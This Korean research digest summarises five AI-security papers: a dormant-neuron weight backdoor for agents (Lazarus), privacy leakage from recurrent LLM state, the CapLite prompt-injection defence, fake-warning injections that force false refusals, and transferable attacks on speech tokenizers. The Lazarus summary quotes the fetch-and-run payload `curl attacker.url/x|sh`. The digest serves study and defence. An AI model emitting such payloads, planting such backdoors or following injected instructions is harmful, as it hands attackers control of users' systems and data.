# Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
> arXiv 프리프린트 (심사 전). Microsoft Research, Microsoft AI Red Team
> 2026

공개 허브에서 받은 양자화본이나 파인튜닝본, 또는 내부자가 손댄 체크포인트로 에이전트를 돌릴 때, 가중치 몇 개만 바꿔 놓아도 에이전트를 원격으로 조종할 수 있다는 것을 보인 논문입니다. Lazarus는 마지막 SwiGLU 피드포워드 층에서 평소 거의 활성화되지 않는 "휴면 뉴런"을 골라, 트리거 문자열이 문맥에 있을 때만 켜져서 페이로드 토큰 하나를 강하게 밀어 올리도록 가중치를 다시 씁니다. 뉴런 하나가 토큰 하나를 담당하므로 P개 토큰짜리 페이로드에는 뉴런이 대략 P개 필요하고, 이 뉴런들이 차례로 켜지면서 `curl attacker.url/x|sh` 같은 명령을 끝까지 출력하게 됩니다. 가중치는 닫힌 형태의 선형 풀이로 정하고(Lazarus-Analytic), 필요하면 해당 가중치만 수백 번의 경사 하강으로 다듬습니다(Lazarus-SGD). 학습 데이터 오염이나 모델 재학습은 필요 없고, 트리거는 사용자 요청에 들어 있어도 되고 도구 출력처럼 작업 도중에 나타나는 문자열이어도 됩니다. 저자들은 이 아이디어를 2026년 2월 Claude Code(Opus 4.5)가 자율적으로 찾아냈다고 밝혔습니다.

### Contribution
- 1만 2천 개가 넘는 뉴런 가운데 10개 미만을 고치는 것만으로 에이전트를 "잠복 요원"으로 만들 수 있음을 보였습니다. 짧은 페이로드라도 원격 스크립트를 내려받아 실행하는 명령이면 에이전트 권한 전체를 넘겨주는 셈이라, 공격 규모는 수정한 가중치 양이 아니라 에이전트 권한에 따라 정해진다는 점을 짚었습니다.
- 휴면 뉴런은 없애도 예측이 거의 바뀌지 않는다는 성질을 이용해, 정상 입력에서의 출력 변화를 작게 유지하는 구성 방법과 그 근거를 제시했습니다.
- 같은 구조가 가중치에 흔적을 남긴다는 점을 이용해, 기준 모델 없이 체크포인트만 보고 수정 여부를 가려내는 탐지기도 함께 제시했습니다.
- 모델 허브, 모델 공급자, 기업과 사용자 각각에 대한 대응 권고(가중치 감사, 선언한 기반 모델과의 차이 비교, 에이전트 권한 최소화, 명령 실행 전 승인 등)를 정리했습니다.

### Evaluation
- 대상 모델: Nemotron-Terminal-8B, Qwen3.6-27B, Gemma-4-31B-IT. 에이전트 형식은 mini-swe-agent, terminus-2 등입니다.
- Nemotron-Terminal-8B에서 뉴런 7개를 트리거 있는/없는 실행 기록 23개로 맞췄을 때, 트리거가 있는 테스트 기록의 98.8%에서 페이로드를 냈고 평가한 정상 기록에서는 페이로드 유출이 관찰되지 않았습니다(정상 입력의 다음 토큰 KL 발산 평균 0.0180). 학습 기록을 2,405개로 늘리면 99.7%였습니다. Qwen3.6-27B는 뉴런 6개, 기록 23개에서 51.0%, 2,393개에서 83.7%였습니다.
- 수정한 Qwen3.6-27B는 AIME와 Terminal-Bench 점수가 원본과 비슷하게 유지되었고, 맞출 때 보지 못한 에이전트 형식으로도 40%의 정확한 행동 일치를 보였습니다.
- 탐지: 수정 체크포인트 114개와 공개된 정상 체크포인트 103개로 평가했고, 에이전트가 만든 특징 기반 탐지기가 기준 모델 없이 수정본의 91.4%를 오탐률 9.7%로 잡았습니다.
- 신빙성: 공격 성공률은 "기록된 문맥에서 페이로드를 예측하는 비율"이고, 트리거가 걸린 에이전트가 자유롭게 생성하고 실행하는 전체 과정에서 잰 값은 아니라고 저자들이 직접 밝혔습니다. 탐지기도 같은 계열의 수정 방식으로만 시험했으므로, 다른 방식의 가중치 수정에 대한 탐지력은 확인되지 않았습니다.

#### Comment
- 오픈 가중치 모델을 직접 받아 에이전트로 돌리는 환경에서는 "벤치마크 점수가 정상"이라는 사실이 백도어 부재의 근거가 되지 못한다는 점을 구체적인 수치로 보여 준 논문입니다. 모델 가중치도 코드처럼 출처를 확인하고 감사해야 한다는 결론은 모바일 온디바이스 모델 배포에도 그대로 적용됩니다.
- 공격과 탐지를 같은 연구진이 같은 계열로 설계했기 때문에 탐지 성능은 낙관적으로 나왔을 가능성이 있습니다. 반대로 기존 방어인 휴면 뉴런 가지치기(fine-pruning)가 이 페이로드를 제거하는지는 확인하지 않았다고 명시했습니다.

# Privacy Leakage from Recurrent State in LLM Inference
> arXiv 프리프린트 (심사 전). 리하이 대학교, 조지아 공과대학교
> 2026

Qwen3.5나 Nemotron 3 Super처럼 일부 층의 어텐션 KV 캐시를 고정 크기 순환 상태(recurrent state)로 바꾼 하이브리드 LLM에서, 개인화 서비스가 대화 이력을 이 상태로 계속 들고 다닐 때 어떤 정보가 새는지 분석한 논문입니다. KV 캐시는 토큰 위치마다 항목이 따로 있어 지울 대상을 특정할 수 있지만, 순환 상태는 여러 토큰의 기여가 한 항목에 섞여 있어서 프롬프트에서 사실 하나를 지워도 이미 상태에 남은 흔적은 그대로 남습니다. 저자들은 상태 좌표 일부만 관찰하는 소프트웨어 공격자와, 상태를 읽는 연산의 전력만 측정하는 물리 공격자를 나눠 정보가 얼마나 복원되는지, 이후 공개 대화를 거친 뒤에도 남는지, 이후 결정에 실제로 영향을 주는지를 차례로 검증했습니다.

원문 링크:
- arXiv 초록: https://arxiv.org/abs/2611.16048
- arXiv HTML 본문: https://arxiv.org/html/2611.16048
- arXiv PDF: https://arxiv.org/pdf/2611.16048

### Contribution
- 개인화 LLM 서비스에서 보존되는 순환 상태가 프롬프트 본문, 응답, KV 캐시와는 별개로 보호해야 할 기밀 경계라는 점을 실험으로 제시했습니다.
- 정보가 상태에 들어 있는지(복원 가능성), 공개 대화 이후에도 남는지(지속성), 이후 결정을 바꾸는지(인과 영향), 물리 신호로 드러나는지(관측 가능성)를 분리해서 재는 방법론을 정리했습니다.
- 공유 GPU 환경에서 권한 없는 계정이 장치 전체 전력만 읽어 다른 사용자의 나이를 추정할 수 있음을 보였고, 서빙 시스템, GPU 운영자, 가속기 설계자가 각각 맡아야 할 보호 요구 사항을 나눠 제시했습니다.

### Evaluation
- 대상 모델: Qwen 계열 하이브리드 모델과 IBM Granite 4.0-H(공개 구현). 개인 이력은 실험용으로 만든 것과 공개 합성 데이터셋 SynthPAI(300명)를 썼고, 모든 피해자 작업은 저자들 자신의 작업입니다.
- 부분 관찰: 순환 상태의 0.174%(좌표 8,192개)만 관찰해도 처음 보는 128명에 대해 비공개 상태 정보를 83.6~89.1%(기준 25%) 맞혔고, 응답 규칙 세 가지도 기준보다 높게 맞혔습니다. Granite에서는 잡음이 없을 때 응답 규칙 정확도가 100%였습니다.
- 지속성: 공개 대화 24턴 뒤에도 비공개 정보 정확도가 42.2%로, 같은 공개 대화를 쓰되 비공개 정보만 바꾼 대조군(21.1%)보다 높았습니다.
- 인과 영향: 다른 사람의 순환 상태를 이식하면 384쌍 모두에서 이후 결정의 로짓 차이가 이식한 쪽으로 움직였습니다(평균 +1.811).
- 개인 속성: SynthPAI 300명 전원에서 나이 평균 절대 오차 6.56년(중앙값 예측 11.30년)이었고, 성별, 관계, 학력도 기준보다 높았습니다.
- 물리 경로: FPGA 보드(CW305)에서 상태를 한 번 완전히 읽는 연산의 전력으로 비공개 사실을 복원했고, MIG로 나눈 A100에서 권한 없는 계정이 장치 전체 전력으로 나이를 오차 7.78년(기준 11.33년)으로 추정했습니다.
- 신빙성: 사전 등록에 가까운 고정 절차, 대조군, Holm 보정, 부트스트랩 구간을 꼼꼼히 제시해 통계 처리는 엄밀한 편입니다. 다만 공격자가 모델을 알고 라벨이 있는 이력으로 미리 학습한다는 가정이 있고, 물리 실험은 반복 측정을 모아야 해서 실제 서비스 환경에서 그대로 재현될지는 별개 문제입니다.

#### Comment
- 효율을 위해 KV 캐시를 순환 상태로 바꾸는 구조가 늘어나는 만큼, "프롬프트에서 지웠으니 잊었다"는 가정이 성립하지 않는다는 점을 짚은 점이 의미 있습니다. 온디바이스 LLM이 사용자 기억을 상태로 들고 다니는 설계에서도 같은 문제가 생깁니다.
- 공유 GPU 전력 원격 측정은 이전 연구 이후 NVIDIA가 MIG 환경에서 비활성화를 권고한 항목이라, 권고를 따르는 운영 환경에서는 물리 경로의 위험이 줄어듭니다.
- 본문 출처: arXiv PDF(사용자 컴퓨터에서 받음).

# CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts
> arXiv 프리프린트 (심사 전). 도쿄 대학교, 중국과학원 자동화연구소
> 2026

CaMeL, Progent, IPIGuard, DRIFT처럼 강한 보장을 내세우는 프롬프트 인젝션 방어는 에이전트의 모델이 프로그램, 권한 정책, 의존 그래프, 제약 목록 같은 "보안 산출물"을 쓰고 코드가 이를 집행하는 구조입니다. 이 논문은 1.7B~35B 규모의 소형 공개 모델 15종으로 이 방어들을 돌려, 소형 모델이 쓴 보안 산출물은 믿을 수 없다는 점을 먼저 보였습니다. 그 대안으로 제시한 CapLite는 정책을 모델이 쓰지 않고 도구 스키마에서 고정 규칙으로 뽑아냅니다. 요청만 보는 계획 단계가 쓰기 호출을 도구 결과를 읽기 전에 미리 확정하고, 열린 인자는 추출한 후보 가운데서만 고르게 하며, 수신자, 금액, 대상, 주소처럼 "누구 또는 무엇에 영향을 주는지" 정하는 인자가 사용자 요청에 그대로 적혀 있을 때만 쓰기를 허용합니다. 이렇게 하면 주입된 문장이 쓰기 호출을 새로 추가하거나 사용자가 말하지 않은 대상으로 쓰기를 보내는 일이 구조적으로 막힙니다.

원문 링크:
- arXiv 초록: https://arxiv.org/abs/2611.17115
- arXiv HTML 본문: https://arxiv.org/html/2611.17115
- arXiv PDF: https://arxiv.org/pdf/2611.17115

### Contribution
- 모델이 쓴 정책, 그래프, 제약은 "무엇을 허용할지" 정할 때 열린 채로 실패하고(공격 허용), 모델이 쓴 프로그램은 "무엇을 실행할지" 정할 때 닫힌 채로 실패한다(작업 실패)는 점을 15개 모델에서 체계적으로 측정했습니다. 산출물 실패율은 모델 성능과 뚜렷한 상관이 없었고, 방어가 없는 에이전트는 모델이 클수록 인젝션을 더 잘 따랐습니다.
- 보안 결정을 모두 결정적 코드에 맡기는 설계(요청만 보는 계획, 스키마에서 뽑은 인자 역할, 요청 문자열 일치 검사, 후보 중 선택)로 "쓰기 무결성"을 보장했습니다.
- 다른 집행형 방어보다, 그리고 방어 없는 에이전트보다도 토큰을 적게 써서 토큰당 유용성이 가장 높았습니다.

### Evaluation
- 벤치마크: AgentDojo 네 가지 묶음, important_instructions 공격 기준으로 모델당 929개 공격 에피소드, 15개 모델 합계 13,935개입니다. 추가로 공격 변형 두 가지(도구 지식, 읽기 유출, 설명자 충돌)를 8개 모델에서 시험했습니다.
- 공격 성공률: 방어 없음 16.66%, Progent 4.85%, IPIGuard 3.12%, DRIFT 1.54%, CaMeL 0.14%(20건), CapLite 0%(0건). CaMeL은 모델이 쓴 프로그램이 최대 68%의 에피소드(Granite-4.2-8B)에서 실행되지 않았습니다.
- 유용성: 공격 하 유용성은 CapLite 29.0%, CaMeL 27.2%, 방어 없음 50.2%. 에피소드당 토큰은 CapLite 1.71만, CaMeL 9.37만, 방어 없음 2.8만입니다.
- 구성 요소 제거 실험에서 최종 검사기(Mediator)를 빼면 7,432건 중 106건, 쓰기 사전 확정을 빼면 53건의 공격이 성공해 두 장치가 모두 필요함을 보였습니다.
- 신빙성: 공개 벤치마크와 공개 공격을 그대로 썼고, 유용성이 방어 없는 에이전트보다 21%p 낮다는 불리한 결과도 그대로 보고했습니다. 결과가 지나치게 좋게 포장되었다고 보기는 어렵습니다. 다만 벤치마크가 AgentDojo 하나뿐입니다.

#### Comment
- 중국 기관 검증: 공저자 한 명이 중국과학원 자동화연구소 소속이고, 1저자와 마지막 저자는 도쿄 대학교 소속입니다. 평가는 공개 벤치마크(AgentDojo)와 공개 모델로 이루어져 재현 경로가 분명하고, 비교 대상도 이 분야의 대표 방어 네 가지로 적절합니다. 본문에 코드와 에피소드별 결과를 공개한다고 적었지만 저장소 주소는 아직 확인하지 못했습니다.
- 보장 범위는 "쓰기"의 무결성입니다. 사용자가 요청에 대상을 적지 않은 작업은 확인 절차가 필요하고, 읽기만으로 일어나는 정보 노출 전체를 막는 것은 아닙니다(추가 실험의 읽기 유출 공격은 0건이었습니다).
- 온디바이스나 로컬에서 소형 모델로 에이전트를 돌리는 경우에 맞춘 방어라는 점에서 모바일 에이전트 보안과도 바로 닿아 있습니다.
- 본문 출처: arXiv PDF(사용자 컴퓨터에서 받음).

# When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents
> arXiv 프리프린트 (심사 전). 저자 1인(Charles Xiao), 소속 표기 없음
> 2026

도구를 쓰는 에이전트가 "위험하니 하지 않겠다"고 멈추는 결정 자체를 공격에 쓸 수 있다는 논문입니다. 공격자가 문서 본문처럼 신뢰도가 낮은 경로에 "긴급 컴플라이언스 보류" 같은 가짜 경고를 넣으면, 실제 업무 상태는 그대로인데도 에이전트가 정당한 작업을 거부하게 됩니다. 간접 프롬프트 인젝션의 한 형태지만 해로운 행동을 시키는 대신 정당한 서비스를 막는 가용성 공격입니다. 저자는 AgentAbstain 벤치마크의 "해야 함/멈춰야 함" 짝 과제를 바탕으로, 경고 내용, 출처, 문구를 하나씩 바꾼 변형 과제를 만들고, 경고를 권위 있는 기록이나 원문과 대조한 뒤에만 멈추도록 하는 Verify-Before-Abstain 절차를 평가했습니다.

원문 링크:
- arXiv 초록: https://arxiv.org/abs/2611.14864
- arXiv HTML 본문: https://arxiv.org/html/2611.14864
- arXiv PDF: https://arxiv.org/pdf/2611.14864

### Contribution
- "신중함을 우선하라"는 지시를 넣는 흔한 안전 조치가 오히려 가짜 경고에 의한 과잉 거부를 크게 늘린다는 점을 보였습니다.
- 같은 위험을 경고 문구로 쓰느냐 사실 서술로 쓰느냐에 따라 멈추는 비율이 크게 달라진다는 문구 민감도를 측정했습니다.
- 출처 등급을 붙이고 경고를 권위 있는 기록과 대조하게 하는 방어가 정당한 작업 완료를 회복시키는 정도와, 문서 안 출처 표시를 위조하는 경우와 권위 있는 기록 자체를 고치는 경우의 차이를 구분해 평가했습니다.

### Evaluation
- 대상 모델: deepseek-v4-pro, gpt-5.4, gemini-3-flash. 주입 가능한 과제 짝 51개(약 21개 환경), 응답 판정은 gpt-5.4로 고정했습니다.
- 과잉 거부율(정상 과제는 통과하고 가짜 경고 과제는 실패한 비율): 기본 프롬프트 대비 신중함 우선 프롬프트에서 deepseek 21.6%에서 64.7%, gpt-5.4 27.5%에서 41.2%, gemini 9.8%에서 86.3%로 늘었고, 세 모델 모두 McNemar 검정 p < 0.0001이었습니다. gemini는 정상 과제 완료율이 96%로 그대로인데 과잉 거부만 늘었습니다.
- 문구 민감도(7쌍): deepseek는 경고 문구일 때 100%, 사실 서술일 때 0% 멈췄습니다. 다른 두 모델은 같은 방향이지만 통계적으로 유의하지 않았습니다.
- 방어: 문서 분석 과제 15쌍에서 가짜 경고 과제 완료율이 신중함 우선 대비 deepseek 27%에서 100%, gpt-5.4 33%에서 73%, gemini 13%에서 100%로 회복되었습니다. 문서 안 출처 표시 위조는 거의 통하지 않았고(0~20%), 권위 있는 기록 자체를 바꾸면 93~100% 멈췄는데 이 경우는 멈추는 것이 맞는 상황입니다.
- 신빙성: 저자가 직접 밝히듯 표본이 작고(7~51쌍) 대부분 조건이 과제당 1회 실행이며, 평가 모델과 판정 모델이 같은 gpt-5.4입니다. 출판 환경에서는 문구 효과가 재현되지 않았고, 방어를 적용하면 기밀 내용 유출이 오히려 늘어난 모델도 있었습니다.

#### Comment
- "에이전트가 많이 거부할수록 안전하다"는 평가 관행에 대한 반례로 읽을 만합니다. 거부 결정도 근거의 출처를 따져야 한다는 결론은 메일, 문서, 웹을 읽는 모바일 에이전트에도 그대로 해당합니다.
- 출처 등급은 실험에서 정답을 알고 붙여 준 것이고, 실제 출처 인증을 구현한 것은 아닙니다. 방어 효과는 이 가정에 의존합니다.
- 이월 후보였던 논문으로, 이번 실행에서 본문을 읽어 정식 요약으로 실었습니다. 본문 출처: arXiv PDF(사용자 컴퓨터에서 받음).

# Speech Tokenizers are Vulnerable: Transferable Semantic Attack and Robust Tokenizer
> NeurIPS 2026 채택 논문 (심사 완료). arXiv 공개판. 칭화대학교 선전국제대학원, 베이징 우전대학교
> 2026

음성 인식(ASR)과 대형 오디오 언어 모델(LALM)의 앞단에서 음성을 표현이나 토큰으로 바꾸는 음성 토크나이저가 의미 수준에서 취약하다는 점을 보인 논문입니다. T-SemAttack은 S3Tokenizer, HuBERT, Whisper 인코더, MFCC라는 대리 인코더 네 개의 표현이 원래 음성과 최대한 달라지도록(코사인 유사도를 낮추도록) 파형에 작은 섭동을 더합니다. 심리음향 마스킹 제약으로 섭동이 원래 음성이 강한 대역에 숨도록 하고, PGD 방식으로 500회 최적화합니다. 대상 모델의 내부에는 접근하지 않는 전이 공격입니다. 저자들은 여러 인코더의 입력 기울기가 비슷한 방향을 가리킨다는 분석으로 전이성을 설명하고, 이를 바탕으로 잡음 섞인 입력으로 학습하고 Whisper를 교사로 의미를 증류하는 강건 토크나이저 ROSETok을 제안했습니다.

원문 링크:
- arXiv 초록: https://arxiv.org/abs/2611.14929
- arXiv HTML 본문: https://arxiv.org/html/2611.14929
- arXiv PDF: https://arxiv.org/pdf/2611.14929
- 저자 프로젝트 페이지(코드와 데모, 논문에 표기): https://wxzyd123.github.io/t-semattack
- 저자 공개 모델(ROSETok): https://huggingface.co/wxzyd123/ROSETok

### Contribution
- 가우시안 잡음에 강한 토크나이저도 의미를 겨냥한 섭동에는 크게 무너진다는 점을 보였습니다. 예를 들어 StableToken은 잡음에서 95.4점을 유지했지만 T-SemAttack에서는 35.0점으로 떨어졌습니다.
- 층별 표현 변화(HuBERT 최종 층 코사인 유사도 0.881에서 0.079로 하락), 대리 모델 간 공통 공격 방향, 섭동 크기에 따른 효과를 분석해 전이 원인을 설명했습니다.
- 강건 토크나이저 ROSETok과 공격 인지 미세 조정판(ROSETok-AAF)을 공개했습니다.

### Evaluation
- 데이터: LibriTTS, Seed-TTS-Eval(영어 200개, 중국어 200개 발화). 대상: 공개 ASR 4종(Qwen3-ASR, VibeVoice-ASR, FireRed-ASR, Fun-ASR), 상용 블랙박스 3종(iFlytek, Doubao, GPT-4o-mini-transcribe), LALM 4종(Qwen2-Audio, Qwen3-Omni, Audio-Flamingo 3, Gemini-3-Flash).
- LibriTTS에서 단어 오류율(WER)이 깨끗한 음성의 1~4%에서 20.0~63.6%로 올랐고, iFlytek 49.6%, GPT-4o-mini-transcribe 46.1%였습니다. 비교 대상 E2E-VGuard는 평균 8.5%였고, AudioShield는 오류율은 높지만 신호 대 잡음비가 -2.4dB로 음성 자체를 망가뜨렸습니다. T-SemAttack의 신호 대 잡음비는 16.3dB, 주관 음질 점수는 3.01입니다.
- LALM에서는 11개 조합 평균 WER 58.30%(E2E-VGuard 16.76%), 음성 질의응답 품질 점수는 평균 7.58에서 5.48로 떨어졌습니다. Denoiser, DeepFilterNet3, AudioPure 같은 방어를 거친 뒤에도 오류율이 21.6~114%로 남았습니다.
- ROSETok-AAF는 공격 입력에서 하류 의도 인식 점수 77.9로 기존 토크나이저(최고 35.0)보다 높았습니다.
- 신빙성: WER이 100%를 넘는 값은 삽입 오류 때문이고, 가장 큰 값들은 공격에 직접 쓴 대리 모델(HuBERT, Whisper)에서 나온 것이라 전이 성능으로 보면 안 됩니다. ROSETok-AAF는 T-SemAttack 예제로 미세 조정한 뒤 같은 공격으로 평가했기 때문에, 처음 보는 공격에 대한 강건성은 확인되지 않았습니다.

#### Comment
- 중국 기관 검증: 저자 전원이 칭화대학교와 베이징 우전대학교 소속입니다. 게재처는 NeurIPS 2026(본문 표기와 arXiv comment 일치)으로 신뢰도가 높고, 프로젝트 페이지와 Hugging Face 모델이 실제로 공개되어 있어 재현 경로가 있습니다. 비교 대상(E2E-VGuard, AudioShield)과 상용 시스템을 함께 평가했고 상용 시스템에서는 효과가 상대적으로 작게 나온 결과(Doubao 20.0%)도 그대로 보고해 지표가 과장되었다고 보기는 어렵습니다. 다만 상용 API 결과는 호출 시점의 모델 버전에 따라 달라질 수 있습니다.
